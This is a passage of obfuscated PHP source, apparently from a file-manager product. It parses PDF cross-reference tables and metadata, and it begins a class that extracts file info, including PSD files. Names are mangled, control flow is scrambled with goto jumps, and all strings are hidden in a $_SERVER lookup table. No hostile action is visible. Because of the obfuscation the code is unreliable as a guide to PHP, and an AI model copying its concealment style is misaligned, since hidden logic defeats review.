$F¿ö¦éå¨«[1]; } $Aæ­ÎŠ¦±[$A¡×ÙìÔĞğ[1551]] = 0; $bò°óæñØ = $A¡×ÙìÔĞğ[1552]; goto Fê…ƒ£Ñ„ƒ; DÏˆ«Û™Ìå: if ($CÌ‚—éêˆË) { $Fƒ»÷¸¯œ = $CÌ‚—éêˆË[$A¡×ÙìÔĞğ[1548]][$A¡×ÙìÔĞğ[1205]]; $Aæ­ÎŠ¦± = self::getObjectValue($aœÏªŸ‰‰ä, $CÌ‚—éêˆË, $Fƒ»÷¸¯œ); } $Aæ­ÎŠ¦± = is_array($Aæ­ÎŠ¦±) ? $Aæ­ÎŠ¦± : array(); $Aæ­ÎŠ¦±[$A¡×ÙìÔĞğ[162]] = 0; goto b«¿í“ä‚œ; b«¿í“ä‚œ: $bò°óæñØ = $A¡×ÙìÔĞğ[1549]; preg_match($bò°óæñØ, $aœÏªŸ‰‰ä[$A¡×ÙìÔĞğ[1546]], $F¿ö¦éå¨«); if (!$Aæ­ÎŠ¦±[$A¡×ÙìÔĞğ[162]] && count($F¿ö¦éå¨«) == 5) { $Aæ­ÎŠ¦±[$A¡×ÙìÔĞğ[162]] = $F¿ö¦éå¨«[3]; $Aæ­ÎŠ¦±[$A¡×ÙìÔĞğ[163]] = $F¿ö¦éå¨«[4]; } goto E—‹ŸéŸØô; E—‹ŸéŸØô: preg_match($bò°óæñØ, $aœÏªŸ‰‰ä[$A¡×ÙìÔĞğ[1547]], $F¿ö¦éå¨«); if (!$Aæ­ÎŠ¦±[$A¡×ÙìÔĞğ[162]] && count($F¿ö¦éå¨«) == 5) { $Aæ­ÎŠ¦±[$A¡×ÙìÔĞğ[162]] = $F¿ö¦éå¨«[3]; $Aæ­ÎŠ¦±[$A¡×ÙìÔĞğ[163]] = $F¿ö¦éå¨«[4]; } preg_match($A¡×ÙìÔĞğ[1550], $aœÏªŸ‰‰ä[$A¡×ÙìÔĞğ[1546]], $F¿ö¦éå¨«); goto Eâ¿ÓòµÇ½; Fô¼¸ê¿ŠŠ: $A¡×ÙìÔĞğ =& $_SERVER[…Ò×–]; $CÆŞÕ‘´õã = 32 * 1024; $aœÏªŸ‰‰ä = array($A¡×ÙìÔĞğ[784] => fopen($d‚ë×£´¢œ, $A¡×ÙìÔĞğ[1182]), $A¡×ÙìÔĞğ[75] => $d‚ë×£´¢œ, $A¡×ÙìÔĞğ[77] => filesize_64($d‚ë×£´¢œ), $A¡×ÙìÔĞğ[1545] => $CÆŞÕ‘´õã); goto C¥ÁŠ¥Ê³Ë; Fê…ƒ£Ñ„ƒ: preg_match_all($bò°óæñØ, $aœÏªŸ‰‰ä[$A¡×ÙìÔĞğ[1546]], $F¿ö¦éå¨«); if ($F¿ö¦éå¨«[1] && $Aæ­ÎŠ¦±[$A¡×ÙìÔĞğ[1551]] < $F¿ö¦éå¨«[1][0]) { $Aæ­ÎŠ¦±[$A¡×ÙìÔĞğ[1551]] = $F¿ö¦éå¨«[1][0]; } preg_match_all($bò°óæñØ, $aœÏªŸ‰‰ä[$A¡×ÙìÔĞğ[1547]], $F¿ö¦éå¨«); goto BåÆÀµ¦µÄ; BåÆÀµ¦µÄ: if ($F¿ö¦éå¨«[1] && $Aæ­ÎŠ¦±[$A¡×ÙìÔĞğ[1551]] < $F¿ö¦éå¨«[1][0]) { $Aæ­ÎŠ¦±[$A¡×ÙìÔĞğ[1551]] = $F¿ö¦éå¨«[1][0]; } $Aæ­ÎŠ¦± = self::parseInfoItem($Aæ­ÎŠ¦±); return $Aæ­ÎŠ¦±; goto A•‹¹“Èõµ; C¥ÁŠ¥Ê³Ë: $aœÏªŸ‰‰ä[$A¡×ÙìÔĞğ[1546]] = StreamWrapperIO::read($d‚ë×£´¢œ, 0, $CÆŞÕ‘´õã); $aœÏªŸ‰‰ä[$A¡×ÙìÔĞğ[1547]] = StreamWrapperIO::read($d‚ë×£´¢œ, $aœÏªŸ‰‰ä[$A¡×ÙìÔĞğ[77]] - $CÆŞÕ‘´õã, $CÆŞÕ‘´õã); $CÌ‚—éêˆË = self::decodeXref($aœÏªŸ‰‰ä); goto DÏˆ«Û™Ìå; A•‹¹“Èõµ: } private static function parseInfoItem($C†İÀÔ×Ö‡) { $aºö™‡…ùî =& $_SERVER[…Ò×–]; if (!$C†İÀÔ×Ö‡) { return !1; } $b¶¿ºÅ›àæ = array($aºö™‡…ùî[1354] => array($aºö™‡…ùî[1553], $aºö™‡…ùî[33]), $aºö™‡…ùî[1554] => array($aºö™‡…ùî[1555], $aºö™‡…ùî[33]), $aºö™‡…ùî[191] => array($aºö™‡…ùî[1556], $aºö™‡…ùî[214]), $aºö™‡…ùî[107] => array($aºö™‡…ùî[1557], $aºö™‡…ùî[214]), $aºö™‡…ùî[1551] => array($aºö™‡…ùî[1551], $aºö™‡…ùî[280]), $aºö™‡…ùî[162] => array($aºö™‡…ùî[162], $aºö™‡…ùî[280]), $aºö™‡…ùî[163] => array($aºö™‡…ùî[163], $aºö™‡…ùî[280]), $aºö™‡…ùî[1558] => array($aºö™‡…ùî[1559], $aºö™‡…ùî[33]), $aºö™‡…ùî[1560] => array($aºö™‡…ùî[1561], $aºö™‡…ùî[33]), $aºö™‡…ùî[1562] => array($aºö™‡…ùî[1353], $aºö™‡…ùî[33])); $D¾š¸½‹â = array(); foreach ($b¶¿ºÅ›àæ as $C¹åÔìğ¶É => $eè‘ô’ÍòÒ) { if (!isset($C†İÀÔ×Ö‡[$eè‘ô’ÍòÒ[0]])) { continue; } $C½Î“øÜİÅ = $C†İÀÔ×Ö‡[$eè‘ô’ÍòÒ[0]]; if (!$C½Î“øÜİÅ || is_array($C½Î“øÜİÅ)) { continue; } switch ($eè‘ô’ÍòÒ[1]) { case $aºö™‡…ùî[280]: $C½Î“øÜİÅ = intval($C½Î“øÜİÅ); break; case $aºö™‡…ùî[214]: if (substr($C½Î“øÜİÅ, 0, 2) == $aºö™‡…ùî[1563]) { $C½Î“øÜİÅ = substr($C½Î“øÜİÅ, 2, 14); } if (strtotime($C½Î“øÜİÅ)) { $C½Î“øÜİÅ = date($aºö™‡…ùî[1564], strtotime($C½Î“øÜİÅ)); } break; } $D¾š¸½‹â[$C¹åÔìğ¶É] = $C½Î“øÜİÅ; } return $D¾š¸½‹â; } private static function decodeXref(&$bŸµ‰¡Å›Á) { goto cÚ‡œ¯­¶; E„õâóæ„æ: foreach ($a¢¦‘Ÿ¢¿Ë[3] as $AÀ¬Úƒ±ˆê => $f Ÿ­¶·˜Î) { if ($a¢¦‘Ÿ¢¿Ë[3][$AÀ¬Úƒ±ˆê] == $A¯†˜Ôƒµä[1568]) { $Aµ×¢òô°Ã = $DÖÒ¨êÍÂØ . $A¯†˜Ôƒµä[70] . intval($a¢¦‘Ÿ¢¿Ë[2][$AÀ¬Úƒ±ˆê]); $Dã‚ê±·‘À[$A¯†˜Ôƒµä[1565]][$Aµ×¢òô°Ã] = intval($a¢¦‘Ÿ¢¿Ë[1][$AÀ¬Úƒ±ˆê]); ++$DÖÒ¨êÍÂØ; } else { if ($a¢¦‘Ÿ¢¿Ë[3][$AÀ¬Úƒ±ˆê] == $A¯†˜Ôƒµä[1569]) { ++$DÖÒ¨êÍÂØ; } else { } } } if (preg_match_all($A¯†˜Ôƒµä[1570], $C²®¤§Ÿ·Î, $a¢¦‘Ÿ¢¿Ë)) { $C«ŒôÂ¯À­ = $bŸµ‰¡Å›Á[$A¯†˜Ôƒµä[77]] - $bŸµ‰¡Å›Á[$A¯†˜Ôƒµä[1545]]; foreach ($a¢¦‘Ÿ¢¿Ë[0] as $AÀ¬Úƒ±ˆê => $DƒáÁá´Û‹) { $Cõ½ŸÏšĞñ = $a¢¦‘Ÿ¢¿Ë[1][$AÀ¬Úƒ±ˆê] . $A¯†˜Ôƒµä[70] . $a¢¦‘Ÿ¢¿Ë[2][$AÀ¬Úƒ±ˆê]; $Dã‚ê±·‘À[$A¯†˜Ôƒµä[1565]][$Cõ½ŸÏšĞñ] = strpos($C²®¤§Ÿ·Î, $DƒáÁá´Û‹) + $C«ŒôÂ¯À­ + 1; } } if (preg_match_all($A¯†˜Ôƒµä[1571], $C²®¤§Ÿ·Î, $a¢¦‘Ÿ¢¿Ë)) { $aĞÆİŸñ—¯ = count($a¢¦‘Ÿ¢¿Ë[1]) == 1 ? $a¢¦‘Ÿ¢¿Ë[1][0] : $a¢¦‘Ÿ¢¿Ë[1][1]; } else { $aĞÆİŸñ—¯ = substr($C²®¤§Ÿ·Î, -1024 * 5); } goto DÒêÖÓªëŠ; cÚ‡œ¯­¶: $A¯†˜Ôƒµä =& $_SERVER[…Ò×–]; $C²®¤§Ÿ·Î = $bŸµ‰¡Å›Á[$A¯†˜Ôƒµä[1547]]; $Dã‚ê±·‘À = array($A¯†˜Ôƒµä[1548] => array(), $A¯†˜Ôƒµä[1565] => array()); goto DÎµãƒ¶‰ø; DÎµãƒ¶‰ø: $E°ø¢†ƒ¶Ø = $A¯†˜Ôƒµä[1566]; if (!preg_match_all($E°ø¢†ƒ¶Ø, $C²®¤§Ÿ·Î, $a¢¦‘Ÿ¢¿Ë, PREG_SET_ORDER, 0)) { return !1; } $fÖÎšÇ¶”Ü = intval($a¢¦‘Ÿ¢¿Ë[0][1]); goto Câœïã×Óä; DÒêÖÓªëŠ: if (preg_match($A¯†˜Ôƒµä[1572], $aĞÆİŸñ—¯, $a¢¦‘Ÿ¢¿Ë) > 0) { $Dã‚ê±·‘À[$A¯†˜Ôƒµä[1548]][$A¯†˜Ôƒµä[77]] = intval($a¢¦‘Ÿ¢¿Ë[1]); } if (preg_match($A¯†˜Ôƒµä[1573], $aĞÆİŸñ—¯, $a¢¦‘Ÿ¢¿Ë) > 0) { $Dã‚ê±·‘À[$A¯†˜Ôƒµä[1548]][$A¯†˜Ôƒµä[1574]] = intval($a¢¦‘Ÿ¢¿Ë[1]) . $A¯†˜Ôƒµä[70] . intval($a¢¦‘Ÿ¢¿Ë[2]); } if (preg_match($A¯†˜Ôƒµä[1575], $aĞÆİŸñ—¯, $a¢¦‘Ÿ¢¿Ë) > 0) { $Dã‚ê±·‘À[$A¯†˜Ôƒµä[1548]][$A¯†˜Ôƒµä[1576]] = intval($a¢¦‘Ÿ¢¿Ë[1]) . $A¯†˜Ôƒµä[70] . intval($a¢¦‘Ÿ¢¿Ë[2]); } goto Fôç¨¤À°‡; Câœïã×Óä: if ($bŸµ‰¡Å›Á[$A¯†˜Ôƒµä[77]] - $fÖÎšÇ¶”Ü > $bŸµ‰¡Å›Á[$A¯†˜Ôƒµä[1545]]) { $BĞ°ÈÊÔ = 4 * $bŸµ‰¡Å›Á[$A¯†˜Ôƒµä[1545]]; $bŸµ‰¡Å›Á[$A¯†˜Ôƒµä[1545]] = $BĞ°ÈÊÔ; $bŸµ‰¡Å›Á[$A¯†˜Ôƒµä[1546]] = StreamWrapperIO::read($bŸµ‰¡Å›Á[$A¯†˜Ôƒµä[75]], 0, $BĞ°ÈÊÔ); $bŸµ‰¡Å›Á[$A¯†˜Ôƒµä[1547]] = StreamWrapperIO::read($bŸµ‰¡Å›Á[$A¯†˜Ôƒµä[75]], $bŸµ‰¡Å›Á[$A¯†˜Ôƒµä[77]] - $BĞ°ÈÊÔ, $BĞ°ÈÊÔ); $C²®¤§Ÿ·Î = $bŸµ‰¡Å›Á[$A¯†˜Ôƒµä[1547]]; } $DÖÒ¨êÍÂØ = 0; preg_match_all($A¯†˜Ôƒµä[1567], $C²®¤§Ÿ·Î, $a¢¦‘Ÿ¢¿Ë); goto E„õâóæ„æ; f¿¨·Š®¬˜: if (preg_match($A¯†˜Ôƒµä[1579], $aĞÆİŸñ—¯, $a¢¦‘Ÿ¢¿Ë) > 0) { } return $Dã‚ê±·‘À; goto cìŒ›ÛÖé„; Fôç¨¤À°‡: if (preg_match($A¯†˜Ôƒµä[1577], $aĞÆİŸñ—¯, $a¢¦‘Ÿ¢¿Ë) > 0) { $Dã‚ê±·‘À[$A¯†˜Ôƒµä[1548]][$A¯†˜Ôƒµä[1205]] = intval($a¢¦‘Ÿ¢¿Ë[1]) . $A¯†˜Ôƒµä[70] . intval($a¢¦‘Ÿ¢¿Ë[2]); } if (preg_match($A¯†˜Ôƒµä[1578], $aĞÆİŸñ—¯, $a¢¦‘Ÿ¢¿Ë) > 0) { $Dã‚ê±·‘À[$A¯†˜Ôƒµä[1548]][$A¯†˜Ôƒµä[371]] = array(); $Dã‚ê±·‘À[$A¯†˜Ôƒµä[1548]][$A¯†˜Ôƒµä[371]][0] = $a¢¦‘Ÿ¢¿Ë[1]; $Dã‚ê±·‘À[$A¯†˜Ôƒµä[1548]][$A¯†˜Ôƒµä[371]][1] = $a¢¦‘Ÿ¢¿Ë[2]; } if (!$Dã‚ê±·‘À[$A¯†˜Ôƒµä[1548]][$A¯†˜Ôƒµä[1205]]) { return !1; } goto f¿¨·Š®¬˜; cìŒ›ÛÖé„: } private static function getObjectValue($Eêë¿§¯Ú, $fï²¯÷—µÍ, $d¬»éŒ¨Ë‚) { goto bÏ¤·èŠÉŞ; dÒÖÜ£¢Ç: return $Bù…Íêé; goto c·ç¦Û; BÖº›Ä™áÏ: if (!is_array($B‘œ´¼“‹”[1])) { return array(); } $Bù…Íêé = array(); for ($cÓœ¨«˜ˆœ = 0; $cÓœ¨«˜ˆœ < count($B‘œ´¼“‹”[1]); $cÓœ¨«˜ˆœ += 2) { $d“³‰³š› = $B‘œ´¼“‹”[1][$cÓœ¨«˜ˆœ]; $D÷Ê‰ƒÊá = $B‘œ´¼“‹”[1][$cÓœ¨«˜ˆœ + 1]; if (count($d“³‰³š›) == 3 && $d“³‰³š›[0] == $CŞ¤‚§Èë[8]) { $eªÈÜ˜“Øê = !1; if ($D÷Ê‰ƒÊá[0] == $CŞ¤‚§Èë[1580]) { $D÷Ê‰ƒÊá = self::getObject($Eêë¿§¯Ú, $fï²¯÷—µÍ[$CŞ¤‚§Èë[1565]][$D÷Ê‰ƒÊá[1]]); } $eªÈÜ˜“Øê = $D÷Ê‰ƒÊá[1]; if ($eªÈÜ˜“Øê === !1) { continue; } if (is_string($eªÈÜ˜“Øê)) { $eªÈÜ˜“Øê = self::decodeStr($eªÈÜ˜“Øê); } $Bù…Íêé[$d“³‰³š›[1]] = $eªÈÜ˜“Øê; } } goto dÒÖÜ£¢Ç; bÏ¤·èŠÉŞ: $CŞ¤‚§Èë =& $_SERVER[…Ò×–]; $B‘œ´¼“‹” = self::getObject($Eêë¿§¯Ú, $fï²¯÷—µÍ[$CŞ¤‚§Èë[1565]][$d¬»éŒ¨Ë‚]); if (is_string($B‘œ´¼“‹”[1])) { return $B‘œ´¼“‹”[1]; } goto BÖº›Ä™áÏ; c·ç¦Û: } private static function getObject($F†ªŸ”»í, $c¯áèá‰Áõ) { $eÕ†Ğóàœ = self::getObjectItem($F†ªŸ”»í, $c¯áèá‰Áõ); $eÕ†Ğóàœ = self::getObjectItem($F†ªŸ”»í, $eÕ†Ğóàœ[2]); return $eÕ†Ğóàœ; } private static function getObjectItem($FãëŸÊ†ø”, $fÄ‘î†¶ÒÓ) { goto c×á¡Â£À; c×á¡Â£À: $b‰µƒ‡¬ƒí =& $_SERVER[…Ò×–]; $A‚¦Ó§É = $FãëŸÊ†ø”[$b‰µƒ‡¬ƒí[1545]]; $fšæÍÕÑõÍ = $FãëŸÊ†ø”[$b‰µƒ‡¬ƒí[77]] - $A‚¦Ó§É; goto E—Àš¥ğòš; A§¿‚ˆ¹„œ: $dãÇß†ïŠ¦ = self::getRawObject($A…ŠÚ„², $E£òğ·“ç); if ($fÄ‘î†¶ÒÓ >= $fšæÍÕÑõÍ) { $dãÇß†ïŠ¦[2] = $dãÇß†ïŠ¦[2] + $fšæÍÕÑõÍ; } else { if ($fÄ‘î†¶ÒÓ > $A‚¦Ó§É && $fÄ‘î†¶ÒÓ <= $fšæÍÕÑõÍ) { $dãÇß†ïŠ¦[2] = $dãÇß†ïŠ¦[2] + $fÄ‘î†¶ÒÓ; } } return $dãÇß†ïŠ¦; goto D ¿®Ä; E—Àš¥ğòš: $E£òğ·“ç = $fÄ‘î†¶ÒÓ >= $fšæÍÕÑõÍ ? $fÄ‘î†¶ÒÓ - $fšæÍÕÑõÍ : $fÄ‘î†¶ÒÓ; $A…ŠÚ„² = $fÄ‘î†¶ÒÓ >= $fšæÍÕÑõÍ ? $FãëŸÊ†ø”[$b‰µƒ‡¬ƒí[1547]] : $FãëŸÊ†ø”[$b‰µƒ‡¬ƒí[1546]]; if ($fÄ‘î†¶ÒÓ > $A‚¦Ó§É && $fÄ‘î†¶ÒÓ <= $fšæÍÕÑõÍ) { $E£òğ·“ç = 0; $A…ŠÚ„² = StreamWrapperIO::read($FãëŸÊ†ø”[$b‰µƒ‡¬ƒí[75]], $fÄ‘î†¶ÒÓ, $A‚¦Ó§É); } goto A§¿‚ˆ¹„œ; D ¿®Ä: } private static function decodeStr($Bˆ¥È„§Œ) { goto bØ‹Œ¢¾; bØ‹Œ¢¾: $dñì’©Ê©Ë =& $_SERVER[…Ò×–]; $Bˆ¥È„§Œ = str_replace(array($dñì’©Ê©Ë[1581], $dñì’©Ê©Ë[1582], $dñì’©Ê©Ë[1583], $dñì’©Ê©Ë[1584], $dñì’©Ê©Ë[1585], $dñì’©Ê©Ë[1586], $dñì’©Ê©Ë[1587], $dñì’©Ê©Ë[1588]), array($dñì’©Ê©Ë[93], $dñì’©Ê©Ë[50], $dñì’©Ê©Ë[8], $dñì’©Ê©Ë[252], $dñì’©Ê©Ë[826], $dñì’©Ê©Ë[221], $dñì’©Ê©Ë[999], $dñì’©Ê©Ë[334]), $Bˆ¥È„§Œ); $fÃÓ‰Š¢Ïä = preg_split($dñì’©Ê©Ë[1589], $Bˆ¥È„§Œ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto f†“ÇïÍÆÉ; f†“ÇïÍÆÉ: $Bˆ¥È„§Œ = $dñì’©Ê©Ë[33]; foreach ($fÃÓ‰Š¢Ïä as $eè«›¥àäÀ) { if (preg_match($dñì’©Ê©Ë[1590], $eè«›¥àäÀ)) { $Bˆ¥È„§Œ .= \chr(octdec(trim($eè«›¥àäÀ, $dñì’©Ê©Ë[93]))); } else { $Bˆ¥È„§Œ .= $eè«›¥àäÀ; } } $fÃÓ‰Š¢Ïä = preg_split($dñì’©Ê©Ë[1591], $Bˆ¥È„§Œ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto B¤¦‚ÓÅÛÄ; Dóµª¨í«‡: $Bˆ¥È„§Œ = $dñì’©Ê©Ë[33]; foreach ($fÃÓ‰Š¢Ïä as $eè«›¥àäÀ) { if (preg_match($dñì’©Ê©Ë[1595], $eè«›¥àäÀ) && !1 === stripos($eè«›¥àäÀ, $dñì’©Ê©Ë[1596])) { $eè«›¥àäÀ = preg_replace($dñì’©Ê©Ë[1597], $dñì’©Ê©Ë[33], $eè«›¥àäÀ); $eè«›¥àäÀ = trim($eè«›¥àäÀ, $dñì’©Ê©Ë[932]); $eè«›¥àäÀ = pack($dñì’©Ê©Ë[1598], $eè«›¥àäÀ); $Bˆ¥È„§Œ .= $eè«›¥àäÀ; } else { $Bˆ¥È„§Œ .= $eè«›¥àäÀ; } } if (preg_match($dñì’©Ê©Ë[1599], $Bˆ¥È„§Œ)) { $eÌíºçñÏæ = substr($Bˆ¥È„§Œ, 2); $Bˆ¥È„§Œ = $dñì’©Ê©Ë[33]; $D¡®Ïôñœ­ = strlen($eÌíºçñÏæ); for ($B¬¼·ùò¹¶ = 0; $B¬¼·ùò¹¶ < $D¡®Ïôñœ­; $B¬¼·ùò¹¶ += 2) { $Dİ„†Ï†ŠÆ = hexdec(bin2hex(substr($eÌíºçñÏæ, $B¬¼·ùò¹¶, 2))); $Bˆ¥È„§Œ .= mb_convert_encoding($dñì’©Ê©Ë[1600] . intval($Dİ„†Ï†ŠÆ) . $dñì’©Ê©Ë[67], $dñì’©Ê©Ë[1601], $dñì’©Ê©Ë[1602]); } } goto C—ùÈÚï; B¤¦‚ÓÅÛÄ: $Bˆ¥È„§Œ = $dñì’©Ê©Ë[33]; foreach ($fÃÓ‰Š¢Ïä as $eè«›¥àäÀ) { if (preg_match($dñì’©Ê©Ë[1592], $eè«›¥àäÀ)) { $Bˆ¥È„§Œ .= \chr(hexdec(trim($eè«›¥àäÀ, $dñì’©Ê©Ë[1593]))); } else { $Bˆ¥È„§Œ .= $eè«›¥àäÀ; } } $fÃÓ‰Š¢Ïä = preg_split($dñì’©Ê©Ë[1594], $Bˆ¥È„§Œ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto Dóµª¨í«‡; C—ùÈÚï: return $Bˆ¥È„§Œ; goto aÕàñ½äÙ÷; aÕàñ½äÙ÷: } private static function getRawObject($aä•îäÔ, $E¬‹µôò» = 0) { goto f™™¥Õ°íë; Aë¿ˆ®Ñ³: return array($fœ¾§ĞÑ, $f“Öêîóò™, $E¬‹µôò»); goto D™±Ÿ·Æ…×; f™™¥Õ°íë: $d«ùªĞêšˆ =& $_SERVER[…Ò×–]; $fœ¾§ĞÑ = $d«ùªĞêšˆ[33]; $f“Öêîóò™ = $d«ùªĞêšˆ[33]; goto fˆ¡§³¸¢”; fˆ¡§³¸¢”: $E¬‹µôò» += strspn($aä•îäÔ, $d«ùªĞêšˆ[1603], $E¬‹µôò»); $Fãêîòµ = $aä•îäÔ[$E¬‹µôò»]; switch ($Fãêîòµ) { case $d«ùªĞêšˆ[1604]: $EÔ‰ßÔÁëÍ = strcspn($aä•îäÔ, $d«ùªĞêšˆ[1605], $E¬‹µôò»); if ($EÔ‰ßÔÁëÍ > 0) { $E¬‹µôò» += $EÔ‰ßÔÁëÍ; return self::getRawObject($aä•îäÔ, $E¬‹µôò»); } break; case $d«ùªĞêšˆ[8]: $fœ¾§ĞÑ = $Fãêîòµ; ++$E¬‹µôò»; $A‚œšÉÃ¯ = preg_match($d«ùªĞêšˆ[1606], substr($aä•îäÔ, $E¬‹µôò», 256), $AÃ£çÁ‘ÛÌ); if (1 == $A‚œšÉÃ¯) { $f“Öêîóò™ = $AÃ£çÁ‘ÛÌ[1]; $E¬‹µôò» += strlen($f“Öêîóò™); } break; case $d«ùªĞêšˆ[252]: case $d«ùªĞêšˆ[826]: $fœ¾§ĞÑ = $Fãêîòµ; ++$E¬‹µôò»; $c°‡‚ÊËù‡ = $E¬‹µôò»; if ($d«ùªĞêšˆ[252] == $Fãêîòµ) { $BÜë¸œ¸¸ê = 1; while ($BÜë¸œ¸¸ê > 0) { if (!isset($aä•îäÔ[$c°‡‚ÊËù‡])) { break; } $AïÓôØÚèÎ = $aä•îäÔ[$c°‡‚ÊËù‡]; switch ($AïÓôØÚèÎ) { case $d«ùªĞêšˆ[93]: ++$c°‡‚ÊËù‡; break; case $d«ùªĞêšˆ[252]: ++$BÜë¸œ¸¸ê; break; case $d«ùªĞêšˆ[826]: --$BÜë¸œ¸¸ê; break; } ++$c°‡‚ÊËù‡; } $f“Öêîóò™ = substr($aä•îäÔ, $E¬‹µôò», $c°‡‚ÊËù‡ - $E¬‹µôò» - 1); $E¬‹µôò» = $c°‡‚ÊËù‡; } break; case $d«ùªĞêšˆ[157]: case $d«ùªĞêšˆ[481]: $fœ¾§ĞÑ = $Fãêîòµ; ++$E¬‹µôò»; if ($d«ùªĞêšˆ[157] == $Fãêîòµ) { $f“Öêîóò™ = array(); do { $C¸‹•ùÁÅ¸ = $E¬‹µôò»; $e©ã“«©È÷ = self::getRawObject($aä•îäÔ, $E¬‹µôò»); $E¬‹µôò» = $e©ã“«©È÷[2]; $f“Öêîóò™[] = $e©ã“«©È÷; } while ($d«ùªĞêšˆ[481] != $e©ã“«©È÷[0] && $E¬‹µôò» != $C¸‹•ùÁÅ¸); array_pop($f“Öêîóò™); } break; case $d«ùªĞêšˆ[931]: case $d«ùªĞêšˆ[934]: if (isset($aä•îäÔ[$E¬‹µôò» + 1]) && $aä•îäÔ[$E¬‹µôò» + 1] == $Fãêîòµ) { $fœ¾§ĞÑ = $Fãêîòµ . $Fãêîòµ; $E¬‹µôò» += 2; if ($d«ùªĞêšˆ[931] == $Fãêîòµ) { $f“Öêîóò™ = array(); do { $C¸‹•ùÁÅ¸ = $E¬‹µôò»; $e©ã“«©È÷ = self::getRawObject($aä•îäÔ, $E¬‹µôò»); $E¬‹µôò» = $e©ã“«©È÷[2]; $f“Öêîóò™[] = $e©ã“«©È÷; } while ($d«ùªĞêšˆ[1607] != $e©ã“«©È÷[0] && $E¬‹µôò» != $C¸‹•ùÁÅ¸); array_pop($f“Öêîóò™); } } else { $fœ¾§ĞÑ = $Fãêîòµ; ++$E¬‹µôò»; $A‚œšÉÃ¯ = preg_match($d«ùªĞêšˆ[1608], substr($aä•îäÔ, $E¬‹µôò»), $AÃ£çÁ‘ÛÌ); if ($d«ùªĞêšˆ[931] == $Fãêîòµ && 1 == $A‚œšÉÃ¯) { $f“Öêîóò™ = strtr($AÃ£çÁ‘ÛÌ[1], $d«ùªĞêšˆ[1609], $d«ùªĞêšˆ[33]); $E¬‹µôò» += \strlen($AÃ£çÁ‘ÛÌ[0]); } elseif (!1 !== ($EµÆ“—¹¬ = strpos($aä•îäÔ, $d«ùªĞêšˆ[934], $E¬‹µôò»))) { $E¬‹µôò» = $EµÆ“—¹¬ + 1; } } break; default: if ($d«ùªĞêšˆ[1610] == substr($aä•îäÔ, $E¬‹µôò», 6)) { $fœ¾§ĞÑ = $d«ùªĞêšˆ[1610]; $E¬‹µôò» += 6; } elseif ($d«ùªĞêšˆ[99] == substr($aä•îäÔ, $E¬‹µôò», 4)) { $fœ¾§ĞÑ = $d«ùªĞêšˆ[99]; $E¬‹µôò» += 4; $f“Öêîóò™ = $d«ùªĞêšˆ[99]; } elseif ($d«ùªĞêšˆ[1611] == substr($aä•îäÔ, $E¬‹µôò», 4)) { $fœ¾§ĞÑ = $d«ùªĞêšˆ[1612]; $E¬‹µôò» += 4; $f“Öêîóò™ = $d«ùªĞêšˆ[1611]; } elseif ($d«ùªĞêšˆ[1613] == substr($aä•îäÔ, $E¬‹µôò», 5)) { $fœ¾§ĞÑ = $d«ùªĞêšˆ[1612]; $E¬‹µôò» += 5; $f“Öêîóò™ = $d«ùªĞêšˆ[1613]; } elseif ($d«ùªĞêšˆ[1614] == substr($aä•îäÔ, $E¬‹µôò», 6)) { $fœ¾§ĞÑ = $d«ùªĞêšˆ[1614]; $E¬‹µôò» += 6; if (1 == preg_match($d«ùªĞêšˆ[1615], substr($aä•îäÔ, $E¬‹µôò»), $AÃ£çÁ‘ÛÌ)) { $E¬‹µôò» += strlen($AÃ£çÁ‘ÛÌ[0]); $c¨‚«áĞÃö = $d«ùªĞêšˆ[1616]; $A‚œšÉÃ¯ = preg_match($c¨‚«áĞÃö, substr($aä•îäÔ, $E¬‹µôò»), $AÃ£çÁ‘ÛÌ, PREG_OFFSET_CAPTURE); if (1 == $A‚œšÉÃ¯) { $f“Öêîóò™ = substr($aä•îäÔ, $E¬‹µôò», $AÃ£çÁ‘ÛÌ[0][1]); $E¬‹µôò» += $AÃ£çÁ‘ÛÌ[1][1]; } } } elseif ($d«ùªĞêšˆ[1617] == substr($aä•îäÔ, $E¬‹µôò», 9)) { $fœ¾§ĞÑ = $d«ùªĞêšˆ[1617]; $E¬‹µôò» += 9; } elseif (1 == preg_match($d«ùªĞêšˆ[1618], substr($aä•îäÔ, $E¬‹µôò», 33), $AÃ£çÁ‘ÛÌ)) { $fœ¾§ĞÑ = $d«ùªĞêšˆ[1580]; $E¬‹µôò» += strlen($AÃ£çÁ‘ÛÌ[0]); $f“Öêîóò™ = intval($AÃ£çÁ‘ÛÌ[1]) . $d«ùªĞêšˆ[70] . intval($AÃ£çÁ‘ÛÌ[2]); } elseif (1 == preg_match($d«ùªĞêšˆ[1619], substr($aä•îäÔ, $E¬‹µôò», 33), $AÃ£çÁ‘ÛÌ)) { $fœ¾§ĞÑ = $d«ùªĞêšˆ[1620]; $f“Öêîóò™ = intval($AÃ£çÁ‘ÛÌ[1]) . $d«ùªĞêšˆ[70] . intval($AÃ£çÁ‘ÛÌ[2]); $E¬‹µôò» += strlen($AÃ£çÁ‘ÛÌ[0]); } elseif (($Fê´°Ùòìä = strspn($aä•îäÔ, $d«ùªĞêšˆ[1621], $E¬‹µôò»)) > 0) { $fœ¾§ĞÑ = $d«ùªĞêšˆ[1622]; $f“Öêîóò™ = substr($aä•îäÔ, $E¬‹µôò», $Fê´°Ùòìä); $E¬‹µôò» += $Fê´°Ùòìä; } break; } goto Aë¿ˆ®Ñ³; D™±Ÿ·Æ…×: } } class GetInfo { private static $fileTypeArray; public static function get($Aàƒ¼†„§”) { $bËâêª×’ = IO::info($Aàƒ¼†„§”); return self::infoAdd($bËâêª×’); } public static function check() { } public static function infoAdd(&$aÕÖ­œ„Ìµ) { goto c»ÙŒŞ»õ; EÛˆ‡ƒö™ß: if (!$aÕÖ­œ„Ìµ || $aÕÖ­œ„Ìµ[$EöÀñõö[29]] != $EöÀñõö[171]) { return; } if (!self::support($aÕÖ­œ„Ìµ[$EöÀñõö[165]]) || isset($aÕÖ­œ„Ìµ[$EöÀñõö[160]])) { return; } $aë³ƒ™ºÌ = $EöÀñõö[1624] . $aÕÖ­œ„Ìµ[$EöÀñõö[75]]; goto e‡è¹µñˆ; e‡è¹µñˆ: $Aƒ¿İ¹æŠ = $aÕÖ­œ„Ìµ[$EöÀñõö[165]]; try { if ($aÕÖ­œ„Ìµ[$EöÀñõö[165]] == $EöÀñõö[1625]) { $AØ±Ãéê”‘ = self::psdParse($aë³ƒ™ºÌ); $Aƒ¿İ¹æŠ = 